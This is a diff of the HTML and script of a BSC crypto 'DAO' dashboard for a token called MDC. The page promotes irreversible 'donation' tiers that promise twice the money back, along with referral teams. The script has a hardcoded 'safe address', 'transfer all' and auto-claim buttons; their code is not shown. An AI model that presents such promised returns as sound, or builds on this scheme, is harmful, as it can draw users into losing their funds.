@@ -8,145 +8,169 @@
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
       font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-      background: linear-gradient(135deg, #0f172a 0%, #1e293b 50%, #0f172a 100%);
+      background: #000;
       min-height: 100vh;
       color: #fff;
-      padding: 16px;
     }
-    .container { max-width: 500px; margin: 0 auto; }
+    .container { max-width: 420px; margin: 0 auto; padding-bottom: 70px; }
     
-    .header { text-align: center; margin-bottom: 24px; }
-    .header h1 { font-size: 24px; font-weight: bold; background: linear-gradient(90deg, #00d4ff, #22c55e); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 6px; }
-    .header .subtitle { font-size: 13px; color: #22c55e; letter-spacing: 2px; }
+    .header { padding: 20px 16px; text-align: center; border-bottom: 1px solid #1a1a1a; }
+    .header h1 { font-size: 20px; font-weight: 700; letter-spacing: 1px; }
+    .header .subtitle { font-size: 11px; color: #4ade80; margin-top: 4px; }
     
     .card {
-      background: rgba(0, 0, 0, 0.4);
-      border-radius: 16px;
-      padding: 18px;
-      margin-bottom: 16px;
-      border: 1px solid rgba(255,255,255,0.05);
+      background: #1a1a1a;
+      border-radius: 12px;
+      padding: 16px;
+      margin: 12px;
     }
-    .card-title { font-size: 14px; font-weight: bold; color: #94a3b8; margin-bottom: 14px; display: flex; align-items: center; gap: 6px; }
+    .card-title { font-size: 13px; font-weight: 600; color: #9ca3af; margin-bottom: 12px; }
     
-    .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+    .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
     .info-box {
-      background: rgba(0, 0, 0, 0.3);
-      border-radius: 10px;
-      padding: 12px;
+      background: #262626;
+      border-radius: 8px;
+      padding: 10px;
       text-align: center;
     }
-    .info-box label { display: block; font-size: 10px; color: #64748b; margin-bottom: 4px; }
-    .info-box .value { font-size: 16px; color: #00d4ff; font-weight: bold; font-family: monospace; }
-    .info-box .value.green { color: #22c55e; }
-    .info-box .value.orange { color: #f59e0b; }
-    
-    .status-table { background: rgba(0,0,0,0.3); border-radius: 10px; overflow: hidden; }
-    .status-row { display: flex; align-items: center; padding: 10px 12px; border-bottom: 1px solid rgba(255,255,255,0.05); }
-    .status-row:last-child { border-bottom: none; }
-    .status-row .icon { width: 24px; font-size: 14px; }
-    .status-row .name { flex: 1; font-size: 13px; color: #94a3b8; }
-    .status-row .status { font-size: 13px; font-weight: bold; }
-    .status-row .status.success { color: #22c55e; }
-    .status-row .status.warning { color: #fbbf24; }
-    .status-row .status.error { color: #ef4444; }
+    .info-box label { display: block; font-size: 10px; color: #6b7280; margin-bottom: 4px; }
+    .info-box .value { font-size: 14px; color: #4ade80; font-weight: 600; font-family: monospace; }
+    .info-box .value.orange { color: #fbbf24; }
     
     .btn {
-      width: 100%;
       padding: 12px;
-      border-radius: 10px;
+      border-radius: 8px;
       border: none;
       font-size: 14px;
-      font-weight: bold;
+      font-weight: 600;
       cursor: pointer;
-      transition: all 0.2s;
-      margin-top: 8px;
+      transition: opacity 0.2s;
     }
-    .btn-primary { background: linear-gradient(135deg, #00d4ff, #0ea5e9); color: #fff; }
-    .btn-primary:hover { background: linear-gradient(135deg, #0ea5e9, #0284c7); }
-    .btn-success { background: linear-gradient(135deg, #22c55e, #16a34a); color: #fff; }
-    .btn-success:hover { background: linear-gradient(135deg, #16a34a, #15803d); }
-    .btn-warning { background: linear-gradient(135deg, #f59e0b, #d97706); color: #fff; }
-    .btn-warning:hover { background: linear-gradient(135deg, #d97706, #b45309); }
-    .btn-danger { background: linear-gradient(135deg, #ef4444, #dc2626); color: #fff; }
-    .btn-danger:hover { background: linear-gradient(135deg, #dc2626, #b91c1c); }
-    .btn-secondary { background: rgba(255,255,255,0.1); color: #fff; }
-    .btn-secondary:hover { background: rgba(255,255,255,0.15); }
-    .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+    .btn-primary { background: #4ade80; color: #000; }
+    .btn-secondary { background: #374151; color: #fff; }
+    .btn-danger { background: #ef4444; color: #fff; }
     
     .action-row { display: flex; gap: 8px; margin-top: 12px; }
-    .action-row .btn { flex: 1; margin-top: 0; }
+    .action-row .btn { flex: 1; }
     
-    .auto-indicator {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-      padding: 12px;
-      border-radius: 10px;
-      margin-bottom: 12px;
-      background: rgba(34, 197, 94, 0.15);
-      border: 2px solid #22c55e;
-    }
-    .auto-indicator .dot {
-      width: 8px; height: 8px; border-radius: 50%; background: #22c55e;
-      animation: blink 1s infinite;
-    }
-    @keyframes blink { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }
-    .auto-indicator span { font-size: 13px; font-weight: bold; color: #22c55e; }
+    .status-row { display: flex; justify-content: space-between; align-items: center; padding: 8px 0; border-bottom: 1px solid #262626; }
+    .status-row:last-child { border-bottom: none; }
+    .status-row .name { font-size: 12px; color: #9ca3af; }
+    .status-row .status { font-size: 12px; font-weight: 600; }
+    .status-row .status.success { color: #4ade80; }
+    .status-row .status.error { color: #ef4444; }
     
-    .log-list { margin-top: 12px; max-height: 100px; overflow-y: auto; font-size: 11px; }
-    .log-item { padding: 6px 8px; border-radius: 6px; margin-bottom: 4px; background: rgba(0,0,0,0.2); color: #94a3b8; }
+    .log-list { margin-top: 12px; max-height: 80px; overflow-y: auto; font-size: 11px; }
+    .log-item { padding: 5px; border-radius: 4px; margin-bottom: 3px; background: #262626; color: #9ca3af; }
     
     input {
       width: 100%;
-      padding: 12px;
-      border-radius: 10px;
-      border: 1px solid rgba(255,255,255,0.1);
-      background: rgba(0,0,0,0.3);
+      padding: 10px;
+      border-radius: 8px;
+      border: none;
+      background: #262626;
       color: #fff;
-      font-size: 13px;
+      font-size: 12px;
       font-family: monospace;
-      margin-top: 8px;
-    }
-    input:focus { outline: none; border-color: #00d4ff; }
-    
-    .warning-bar { background: rgba(251,191,36,0.2); color: #fbbf24; padding: 10px; border-radius: 10px; font-size: 12px; text-align: center; margin-top: 8px; }
-    
-    .referral-box { background: rgba(0,0,0,0.3); border-radius: 10px; padding: 12px; margin-top: 10px; }
-    .referral-box label { display: block; font-size: 11px; color: #64748b; margin-bottom: 6px; }
-    .referral-row { display: flex; gap: 8px; }
-    .referral-row input { flex: 1; margin-top: 0; }
-    .btn-copy { padding: 12px 15px; background: #8b5cf6; border: none; border-radius: 10px; color: #fff; cursor: pointer; font-size: 13px; white-space: nowrap; }
-    .btn-copy:hover { background: #7c3aed; }
-    
-    .withdraw-section { margin-top: 12px; }
-    .withdraw-section .amount-box {
-      background: rgba(0,0,0,0.3);
-      border-radius: 10px;
-      padding: 14px;
-      margin-bottom: 10px;
-    }
-    .withdraw-section .amount-box .label { font-size: 11px; color: #64748b; margin-bottom: 4px; }
-    .withdraw-section .amount-box .amount { font-size: 24px; font-weight: bold; color: #22c55e; font-family: monospace; }
-    .withdraw-section .fee-box {
-      display: flex; justify-content: space-between; padding: 8px 12px; background: rgba(251,191,36,0.1); border-radius: 8px; margin-bottom: 8px;
-    }
-    .withdraw-section .fee-box span { font-size: 12px; color: #fbbf24; }
-    
-    .wallet-address { font-size: 12px; font-family: monospace; color: #00d4ff; word-break: break-all; }
-    .copy-btn { background: rgba(255,255,255,0.1); border: none; padding: 4px 8px; border-radius: 4px; color: #fff; font-size: 10px; cursor: pointer; }
-    
-    .login-card {
-      background: linear-gradient(135deg, rgba(0,212,255,0.1), rgba(34,197,94,0.1));
-      border: 2px solid rgba(0,212,255,0.3);
     }
     
-    .login-status {
-      display: flex; align-items: center; gap: 8px; margin-top: 8px; padding: 10px; border-radius: 8px;
-      background: rgba(34,197,94,0.1); border: 1px solid #22c55e;
+    .referral-row { display: flex; gap: 8px; margin-top: 8px; }
+    .referral-row input { flex: 1; }
+    .btn-copy { padding: 10px 12px; background: #374151; border: none; border-radius: 8px; color: #fff; cursor: pointer; font-size: 12px; }
+    
+    .wallet-area { margin-top: 10px; }
+    .wallet-address { font-size: 11px; font-family: monospace; color: #4ade80; word-break: break-all; }
+    
+    .auto-indicator {
+      display: flex; align-items: center; justify-content: center; gap: 8px;
+      padding: 10px; border-radius: 8px; background: rgba(74,222,128,0.1); margin-bottom: 12px;
     }
-    .login-status .check-icon { color: #22c55e; font-size: 16px; }
-    .login-status span { color: #22c55e; font-size: 13px; }
+    .auto-indicator .dot { width: 6px; height: 6px; border-radius: 50%; background: #4ade80; animation: blink 1s infinite; }
+    @keyframes blink { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }
+    .auto-indicator span { font-size: 12px; color: #4ade80; }
+    
+    .withdraw-box { background: #262626; border-radius: 8px; padding: 12px; margin-bottom: 10px; }
+    .withdraw-box .label { font-size: 10px; color: #6b7280; margin-bottom: 4px; }
+    .withdraw-box .amount { font-size: 20px; font-weight: 700; color: #4ade80; font-family: monospace; }
+    
+    .fee-row { display: flex; justify-content: space-between; padding: 6px 12px; background: rgba(251,191,36,0.1); border-radius: 6px; margin-bottom: 8px; font-size: 11px; color: #fbbf24; }
+    
+    .nav-bar {
+      position: fixed; bottom: 0; left: 0; right: 0;
+      background: #1a1a1a; border-top: 1px solid #262626;
+      display: flex; justify-content: space-around; padding: 10px 0;
+    }
+    .nav-item { text-align: center; font-size: 10px; color: #6b7280; cursor: pointer; }
+    .nav-item.active { color: #4ade80; }
+    .nav-item .icon { font-size: 18px; margin-bottom: 4px; }
+    
+    .page { display: none; }
+    .page.active { display: block; }
+    
+    .rank-tabs { display: flex; gap: 4px; margin-bottom: 12px; background: #262626; padding: 4px; border-radius: 8px; }
+    .rank-tab { flex: 1; padding: 8px; text-align: center; font-size: 12px; border-radius: 6px; cursor: pointer; }
+    .rank-tab.active { background: #4ade80; color: #000; font-weight: 600; }
+    
+    .countdown-box { background: rgba(74,222,128,0.1); border-radius: 8px; padding: 12px; text-align: center; }
+    .countdown-box .label { font-size: 10px; color: #6b7280; margin-bottom: 4px; }
+    .countdown-box .time { font-size: 24px; font-weight: 700; color: #4ade80; font-family: monospace; }
+    
+    .donate-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-bottom: 12px; }
+    .donate-item {
+      background: #262626; border-radius: 8px; padding: 12px; text-align: center;
+      border: 2px solid transparent; cursor: pointer; transition: all 0.2s;
+    }
+    .donate-item.active { border-color: #4ade80; background: rgba(74,222,128,0.1); }
+    .donate-item .price { font-size: 16px; font-weight: 700; color: #4ade80; margin-bottom: 4px; }
+    .donate-item .name { font-size: 10px; color: #6b7280; }
+    
+    .medal-row { display: flex; justify-content: space-between; align-items: center; padding: 10px 0; border-bottom: 1px solid #262626; }
+    .medal-row:last-child { border-bottom: none; }
+    .medal-row .name { font-size: 12px; color: #9ca3af; }
+    .medal-row .value { font-size: 14px; font-weight: 600; color: #4ade80; font-family: monospace; }
+    
+    .progress-bar { height: 6px; background: #262626; border-radius: 3px; margin-top: 8px; overflow: hidden; }
+    .progress-bar .fill { height: 100%; background: #4ade80; border-radius: 3px; }
+    
+    .member-item { display: flex; align-items: center; padding: 10px 0; border-bottom: 1px solid #262626; }
+    .member-item:last-child { border-bottom: none; }
+    .member-item .avatar { width: 32px; height: 32px; border-radius: 50%; background: #374151; display: flex; align-items: center; justify-content: center; font-size: 14px; margin-right: 10px; }
+    .member-item .info { flex: 1; }
+    .member-item .info .name { font-size: 12px; color: #fff; }
+    .member-item .info .address { font-size: 10px; color: #6b7280; font-family: monospace; }
+    
+    .bill-tabs { display: flex; gap: 4px; margin-bottom: 12px; overflow-x: auto; padding-bottom: 4px; }
+    .bill-tab { padding: 6px 12px; font-size: 11px; border-radius: 6px; background: #262626; white-space: nowrap; cursor: pointer; }
+    .bill-tab.active { background: #4ade80; color: #000; font-weight: 600; }
+    
+    .empty-state { text-align: center; padding: 40px 0; color: #6b7280; font-size: 12px; }
+    
+    .record-item { display: flex; justify-content: space-between; align-items: center; padding: 12px 0; border-bottom: 1px solid #262626; }
+    .record-item:last-child { border-bottom: none; }
+    .record-item .left { flex: 1; }
+    .record-item .left .title { font-size: 12px; color: #fff; margin-bottom: 4px; }
+    .record-item .left .time { font-size: 10px; color: #6b7280; }
+    .record-item .right .amount { font-size: 14px; font-weight: 600; color: #4ade80; font-family: monospace; }
+    .record-item .right .status { font-size: 10px; color: #fbbf24; }
+    
+    .terms-row { display: flex; justify-content: space-between; padding: 8px 0; font-size: 12px; }
+    .terms-row .label { color: #6b7280; }
+    .terms-row .value { color: #4ade80; font-weight: 600; }
+    
+    .warning-box { background: rgba(251,191,36,0.1); border-radius: 6px; padding: 10px; margin-top: 10px; }
+    .warning-box .item { display: flex; align-items: flex-start; gap: 8px; margin-bottom: 8px; font-size: 11px; color: #fbbf24; }
+    .warning-box .item:last-child { margin-bottom: 0; }
+    
+    .detail-box { background: #262626; border-radius: 8px; padding: 14px; margin-bottom: 12px; }
+    .detail-box .detail-row { display: flex; justify-content: space-between; padding: 8px 0; }
+    .detail-box .detail-row .label { font-size: 12px; color: #6b7280; }
+    .detail-box .detail-row .value { font-size: 14px; font-weight: 600; color: #4ade80; }
+    .detail-box .total-row { padding-top: 12px; border-top: 1px solid #374151; }
+    .detail-box .total-row .value { font-size: 24px; color: #4ade80; font-family: monospace; }
+    
+    .balance-row { display: flex; justify-content: space-between; padding: 10px; background: #262626; border-radius: 8px; margin-bottom: 12px; }
+    .balance-row .label { font-size: 12px; color: #6b7280; }
+    .balance-row .value { font-size: 16px; font-weight: 700; color: #4ade80; font-family: monospace; }
   </style>
 </head>
 <body>
@@ -156,119 +180,330 @@
       <div class="subtitle">您的专属 Web3 管理系统</div>
     </div>
 
-    <div class="card login-card">
-      <div class="card-title">� 钱包连接与登录</div>
-      <button class="btn btn-primary" id="connectBtn" onclick="connectWallet()">连接钱包</button>
-      <button class="btn btn-success" id="loginBtn" onclick="signLogin()" style="display:none;">签名登录</button>
-      <div id="loginStatus" style="display:none;" class="login-status">
-        <span class="check-icon">✓</span><span>已登录</span>
+    <div class="page active" id="page-home">
+      <div class="card">
+        <div class="card-title">💰 市场概览</div>
+        <div class="info-grid">
+          <div class="info-box"><label>协议储备</label><div class="value" id="protocolReserve">-</div></div>
+          <div class="info-box"><label>MDC 价格</label><div class="value" id="mdcPrice">$--</div></div>
+        </div>
+        <div class="info-grid">
+          <div class="info-box"><label>结算倒计时</label><div class="value" id="countdown">--:--:--</div></div>
+          <div class="info-box"><label>Gas价格</label><div class="value" id="gasPrice">-</div></div>
+        </div>
       </div>
-      <div id="walletInfo" style="display:none; margin-top: 12px;">
-        <div class="wallet-address" id="currentAddress">-</div>
-        <button class="copy-btn" onclick="copyAddress()">📋 复制</button>
+
+      <div class="card">
+        <div class="card-title">🏆 排行榜</div>
+        <div class="rank-tabs">
+          <div class="rank-tab active">日榜</div>
+          <div class="rank-tab">周榜</div>
+        </div>
+        <div class="countdown-box">
+          <div class="label">结算倒计时</div>
+          <div class="time" id="rankCountdown">15:29:20</div>
+        </div>
+        <div style="text-align: center; margin-top: 12px;">
+          <div style="font-size: 12px; color: #9ca3af;">本人排名</div>
+          <div style="font-size: 24px; font-weight: 700; color: #4ade80;">-</div>
+        </div>
+        <div style="font-size: 11px; color: #6b7280; text-align: center; margin-top: 8px;">
+          本期排行榜虚位以待，期待您的业绩表现
+        </div>
       </div>
-      <div id="networkWarning" class="warning-bar" style="display:none;">⚠️ 请切换到 BSC 主网</div>
+
+      <div class="card">
+        <div class="card-title">📦 捐赠入口</div>
+        <div style="font-size: 11px; color: #6b7280; margin-bottom: 12px;">选择下方档位将跳转至捐赠页，发起链上交易完成捐赠。</div>
+        <div class="donate-grid">
+          <div class="donate-item" onclick="openDonate('basic')">
+            <div class="price">$100</div>
+            <div class="name">基础档</div>
+          </div>
+          <div class="donate-item" onclick="openDonate('growth')">
+            <div class="price">$300</div>
+            <div class="name">成长档</div>
+          </div>
+          <div class="donate-item" onclick="openDonate('elite')">
+            <div class="price">$1,000</div>
+            <div class="name">精英档</div>
+          </div>
+          <div class="donate-item" onclick="openDonate('flagship')">
+            <div class="price">$3,000</div>
+            <div class="name">旗舰档</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-title">🎖️ 勋章数据</div>
+        <div class="info-grid">
+          <div class="info-box"><label>累计发放勋章</label><div class="value">0</div></div>
+          <div class="info-box"><label>今日发放勋章</label><div class="value">0</div></div>
+          <div class="info-box"><label>我的勋章权</label><div class="value">-</div></div>
+          <div class="info-box"><label>今日已获得勋章</label><div class="value">-</div></div>
+        </div>
+        <div style="margin-top: 12px;">
+          <div class="medal-row">
+            <span class="name">勋章权累计</span>
+            <span class="value">V2</span>
+          </div>
+          <div class="medal-row">
+            <span class="name">V3</span>
+            <span class="value">0</span>
+          </div>
+          <div class="medal-row">
+            <span class="name">V4</span>
+            <span class="value">0</span>
+          </div>
+          <div class="medal-row">
+            <span class="name">我的勋章权累计</span>
+            <span class="value">2,065</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-title">📋 核心条款</div>
+        <div class="terms-row">
+          <span class="label">受赠红利区间</span>
+          <span class="value">0.3%-1%</span>
+        </div>
+        <div class="terms-row">
+          <span class="label">受赠结算时间</span>
+          <span class="value">08:00</span>
+        </div>
+        <div style="display: flex; gap: 8px; margin-top: 12px;">
+          <button class="btn btn-primary" onclick="switchTab('donate')">进入捐赠</button>
+          <button class="btn btn-secondary" onclick="switchTab('team')">邀请成员</button>
+        </div>
+      </div>
     </div>
 
-    <div class="card">
-      <div class="card-title">💰 市场概览</div>
-      <div class="info-grid">
-        <div class="info-box"><label>协议储备</label><div class="value" id="protocolReserve">-</div></div>
-        <div class="info-box"><label>MDC 现价</label><div class="value" id="mdcPrice">$--</div></div>
+    <div class="page" id="page-donate">
+      <div class="card">
+        <div class="card-title">📦 捐赠档位</div>
+        <div class="donate-grid">
+          <div class="donate-item active" onclick="selectDonate('basic')">
+            <div class="price">$100</div>
+            <div class="name">基础档</div>
+          </div>
+          <div class="donate-item" onclick="selectDonate('growth')">
+            <div class="price">$300</div>
+            <div class="name">成长档</div>
+          </div>
+          <div class="donate-item" onclick="selectDonate('elite')">
+            <div class="price">$1,000</div>
+            <div class="name">精英档</div>
+          </div>
+          <div class="donate-item" onclick="selectDonate('flagship')">
+            <div class="price">$3,000</div>
+            <div class="name">旗舰档</div>
+          </div>
+        </div>
       </div>
-      <div class="info-grid">
-        <div class="info-box"><label>⏱️ 结算倒计时</label><div class="value" id="countdown">--:--:--</div></div>
-        <div class="info-box"><label>Gas价格</label><div class="value" id="gasPrice">-</div></div>
+
+      <div class="card">
+        <div class="card-title">📋 捐赠详情</div>
+        <div class="detail-box">
+          <div class="detail-row">
+            <span class="label">捐赠价值</span>
+            <span class="value">$1,000</span>
+          </div>
+          <div class="detail-row">
+            <span class="label">收益倍数</span>
+            <span class="value">2倍</span>
+          </div>
+          <div class="detail-row total-row">
+            <span class="label">预计总收益</span>
+            <span class="value">$2,000</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-title">💳 MDC 余额</div>
+        <div class="balance-row">
+          <span class="label">余额</span>
+          <span class="value" id="donateBalance">0.00 MDC</span>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-title">⚠️ 捐赠须知</div>
+        <div class="warning-box">
+          <div class="item">🔒 不可撤销<br>确认捐赠后，价值将锁定，不可撤销。</div>
+          <div class="item">📈 按规则释放<br>收益将按合约时间线性分配。</div>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="balance-row">
+          <span class="label">应付 MDC</span>
+          <span class="value">358.78387 MDC</span>
+        </div>
+        <button class="btn btn-primary" onclick="confirmDonate()">确认捐赠</button>
       </div>
     </div>
 
-    <div class="card">
-      <div class="card-title">👤 我的信息</div>
-      <div class="info-grid">
-        <div class="info-box"><label>我的分层</label><div class="value" id="myTier">-</div></div>
-        <div class="info-box"><label>今日份额</label><div class="value" id="myShare">-</div></div>
-      </div>
-      <div class="info-grid">
-        <div class="info-box"><label>今日发放</label><div class="value green" id="todayDist">-</div></div>
-        <div class="info-box"><label>累计发放</label><div class="value green" id="totalDist">-</div></div>
-      </div>
-    </div>
-
-    <div class="card">
-      <div class="card-title">🔗 推荐信息</div>
-      <div class="info-grid">
-        <div class="info-box"><label>上级地址</label><div class="value" id="referrer">-</div></div>
-        <div class="info-box"><label>🔒 安全地址</label><div class="value" id="safeAddress">0x8558D8A5b90eC7d9f500cdCF0FB49C47292EBCdA</div></div>
-      </div>
-      <div class="referral-box">
-        <label>推荐链接</label>
+    <div class="page" id="page-team">
+      <div class="card">
+        <div class="card-title">🔗 推荐信息</div>
+        <div style="display: flex; gap: 8px; margin-bottom: 12px;">
+          <button class="btn btn-primary" onclick="copyRefLink()">📤 分享链接</button>
+          <button class="btn btn-secondary">📱 二维码</button>
+        </div>
         <div class="referral-row">
           <input type="text" id="refLink" readonly value="">
-          <button class="btn-copy" onclick="copyRefLink()">📋 复制</button>
+          <button class="btn-copy" onclick="copyRefLink()">📋</button>
+        </div>
+        <div class="info-grid" style="margin-top: 12px;">
+          <div class="info-box">
+            <label>上级地址</label>
+            <div class="value" id="parentAddress">--</div>
+          </div>
+          <div class="info-box">
+            <label>我的地址</label>
+            <div class="value" id="myAddress">--</div>
+          </div>
         </div>
       </div>
-    </div>
 
-    <div class="card">
-      <div class="card-title">📊 余额信息</div>
-      <div class="info-grid">
-        <div class="info-box"><label>可领取 MDC</label><div class="value" id="claimable">-</div></div>
-        <div class="info-box"><label>MDC 余额</label><div class="value" id="balance">-</div></div>
+      <div class="card">
+        <div class="card-title">📊 商队数据</div>
+        <div class="info-grid">
+          <div class="info-box"><label>当前数量</label><div class="value">0</div></div>
+          <div class="info-box"><label>商队数量</label><div class="value">0</div></div>
+          <div class="info-box"><label>小区捐赠</label><div class="value">$0</div></div>
+          <div class="info-box"><label>当前级别</label><div class="value">未连接钱包</div></div>
+        </div>
       </div>
-      <button class="btn btn-secondary" onclick="refreshBalances()">🔄 刷新链上数据</button>
+
+      <div class="card">
+        <div class="card-title">🚀 下一里程碑</div>
+        <div style="display: flex; justify-content: space-between; margin-bottom: 8px;">
+          <span style="font-size: 12px; color: #9ca3af;">--</span>
+          <span style="font-size: 12px; font-weight: 600; color: #4ade80;">进度 0%</span>
+        </div>
+        <div class="progress-bar">
+          <div class="fill" style="width: 0%;"></div>
+        </div>
+        <div style="display: flex; justify-content: space-between; margin-top: 8px; font-size: 11px; color: #6b7280;">
+          <span>还差 $0</span>
+          <span>升级规则</span>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-title">👥 商队成员列表</div>
+        <div class="empty-state">暂无成员</div>
+      </div>
     </div>
 
-    <div class="card">
-      <div class="card-title">📤 DAO 提现</div>
-      <div class="withdraw-section">
-        <div class="amount-box">
-          <div class="label">可提现 MDC 余额</div>
+    <div class="page" id="page-asset">
+      <div class="card">
+        <div class="card-title">📊 收益概览</div>
+        <div class="info-grid">
+          <div class="info-box"><label>昨日收益</label><div class="value">0 MDC</div></div>
+          <div class="info-box"><label>累计收益</label><div class="value">0 MDC</div></div>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-title">📦 我的捐赠</div>
+        <div class="empty-state">暂无捐赠记录</div>
+      </div>
+
+      <div class="card">
+        <div class="card-title">📋 流水账单</div>
+        <div class="bill-tabs">
+          <div class="bill-tab active">全部</div>
+          <div class="bill-tab">受赠</div>
+          <div class="bill-tab">直赠</div>
+          <div class="bill-tab">商队</div>
+          <div class="bill-tab">勋章</div>
+          <div class="bill-tab">榜单</div>
+        </div>
+        <div class="empty-state">暂无流水</div>
+      </div>
+
+      <div class="card">
+        <div class="card-title">📤 提现记录</div>
+        <div class="bill-tabs">
+          <div class="bill-tab active">处理中</div>
+          <div class="bill-tab">已完成</div>
+          <div class="bill-tab">已拒绝</div>
+        </div>
+        <div class="empty-state">暂无提现记录</div>
+      </div>
+
+      <div class="card">
+        <div class="card-title">📤 DAO 提现</div>
+        <div class="withdraw-box">
+          <div class="label">可提现 MDC</div>
           <div class="amount" id="withdrawBalance">0.00</div>
         </div>
-        <div class="fee-box">
+        <div class="fee-row">
           <span>协议手续费</span>
           <span>5%</span>
         </div>
-        <div class="amount-box" style="padding: 10px;">
+        <div class="withdraw-box" style="padding: 10px;">
           <div class="label">实收数量（扣费后）</div>
           <div class="amount" id="netAmount">0.00</div>
         </div>
-        <button class="btn btn-warning" id="withdrawBtn" onclick="withdrawDAO()">确认并签名提现</button>
+        <button class="btn btn-primary" onclick="withdrawDAO()">确认提现</button>
       </div>
-    </div>
 
-    <div class="card">
-      <div class="card-title">⚡ 快捷操作</div>
-      <div id="autoStatusArea" style="display:none;" class="auto-indicator">
-        <div class="dot"></div><span>自动领取运行中</span>
+      <div class="card">
+        <div class="card-title">⚡ 快捷操作</div>
+        <div id="autoStatusArea" style="display:none;" class="auto-indicator">
+          <div class="dot"></div><span>自动领取运行中</span>
+        </div>
+        <div class="action-row">
+          <button class="btn btn-secondary" onclick="claimAndTransfer()">领取 MDC</button>
+          <button class="btn btn-secondary" onclick="transferAll()">转账全部</button>
+        </div>
+        <div class="action-row">
+          <button class="btn btn-primary" id="autoBtn" onclick="toggleAuto()">启动自动</button>
+          <button class="btn btn-danger" id="stopBtn" onclick="stopAuto()">停止</button>
+        </div>
+        <div class="log-list" id="logArea"></div>
       </div>
-      <div class="action-row">
-        <button class="btn btn-success" id="claimBtn" onclick="claimAndTransfer()">Claim合约领取</button>
-        <button class="btn btn-primary" id="transferBtn" onclick="transferAll()">转账全部</button>
-      </div>
-      <div class="action-row">
-        <button class="btn" id="autoBtn" onclick="toggleAuto()">启动自动</button>
-        <button class="btn btn-danger" id="stopBtn" onclick="stopAuto()">停止</button>
-      </div>
-      <div class="log-list" id="logArea"></div>
-    </div>
 
-    <div class="card">
-      <div class="card-title">📋 功能状态</div>
-      <div class="status-table">
+      <div class="card">
+        <div class="card-title">📋 功能状态</div>
         <div class="status-row">
-          <span class="icon">💳</span><span class="name">钱包连接</span>
+          <span class="name">💳 钱包连接</span>
           <span class="status error" id="statusWallet">❌ 未连接</span>
         </div>
         <div class="status-row">
-          <span class="icon">🌐</span><span class="name">BSC 网络</span>
-          <span class="status warning" id="statusNetwork">⏳ 检测中</span>
+          <span class="name">🌐 BSC 网络</span>
+          <span class="status error" id="statusNetwork">❌ 未连接</span>
         </div>
         <div class="status-row">
-          <span class="icon">🤖</span><span class="name">自动领取</span>
+          <span class="name">🤖 自动领取</span>
           <span class="status error" id="statusAuto">❌ 已停止</span>
         </div>
       </div>
+    </div>
+  </div>
+
+  <div class="nav-bar">
+    <div class="nav-item active" onclick="switchTab('home')">
+      <div class="icon">🏠</div>
+      <div>首页</div>
+    </div>
+    <div class="nav-item" onclick="switchTab('donate')">
+      <div class="icon">📦</div>
+      <div>捐赠</div>
+    </div>
+    <div class="nav-item" onclick="switchTab('team')">
+      <div class="icon">👥</div>
+      <div>商队</div>
+    </div>
+    <div class="nav-item" onclick="switchTab('asset')">
+      <div class="icon">💰</div>
+      <div>资产</div>
     </div>
   </div>
 
@@ -280,6 +515,8 @@
       CLAIM_CONTRACT: '0xEc5DBf2BACe283143b7B4472a7ce0E445EDA3F1e',
       DAO_CONTRACT: '0x79a558960C2Ee79B22F6Ecc343462A4C7d126E11',
       CHECK_INTERVAL: 30000,
+      API_BASE: 'https://dao-api.mdcdefi.com',
+      REF_URL: 'https://dao.mdcdefi.com/?ref=',
     };
     
     const RPC_LIST = ['https://bsc-dataseed2.defibit.io/', 'https://bscrpc.com/', 'https://rpc.ankr.com/bsc'];
@@ -295,7 +532,27 @@
     ];
     
     let web3, currentAccount, safeAddress = '0x8558D8A5b90eC7d9f500cdCF0FB49C47292EBCdA', 
-        autoInterval, isAutoRunning = false, isLoggedIn = false;
+        autoInterval, isAutoRunning = false, userInfo = null;
+    
+    function switchTab(tab) {
+      document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+      document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+      document.getElementById('page-' + tab).classList.add('active');
+      document.querySelector('.nav-item[onclick="switchTab(\'' + tab + '\')"]').classList.add('active');
+      if (tab === 'asset') {
+        refreshBalances();
+      }
+    }
+    
+    function openDonate(type) {
+      selectDonate(type);
+      switchTab('donate');
+    }
+    
+    function selectDonate(type) {
+      document.querySelectorAll('.donate-item').forEach(d => d.classList.remove('active'));
+      document.querySelector('.donate-item[onclick="selectDonate(\'' + type + '\')"]')?.classList.add('active');
+    }
     
     async function init() {
       if (typeof window.ethereum !== 'undefined') {
@@ -319,7 +576,7 @@
       } catch (e) {}
       startCountdown();
       fetchMarketInfo();
-      
+      loadReferralInfo();
       window.ethereum?.on('accountsChanged', handleAccountsChanged);
       window.ethereum?.on('chainChanged', checkNetwork);
     }
@@ -327,33 +584,10 @@
     function handleAccountsChanged(accounts) {
       if (accounts.length > 0) {
         currentAccount = accounts[0];
-        isLoggedIn = false;
         updateWalletUI();
       } else {
         currentAccount = null;
-        isLoggedIn = false;
         updateWalletUI();
-      }
-    }
-    
-    async function signLogin() {
-      if (!currentAccount) {
-        showLog('请先连接钱包', 'error');
-        return;
-      }
-      try {
-        const message = '登录 MDC 收益辅助系统\n\n地址: ' + currentAccount + '\n时间: ' + new Date().toISOString();
-        const signature = await web3.eth.personal.sign(message, currentAccount);
-        isLoggedIn = true;
-        document.getElementById('loginBtn').style.display = 'none';
-        document.getElementById('loginStatus').style.display = 'flex';
-        showLog('签名登录成功 ✓', 'success');
-        
-        await refreshBalances();
-        await loadReferralInfo();
-        await loadUserInfo();
-      } catch (e) {
-        showLog('登录失败', 'error');
       }
     }
     
@@ -367,8 +601,9 @@
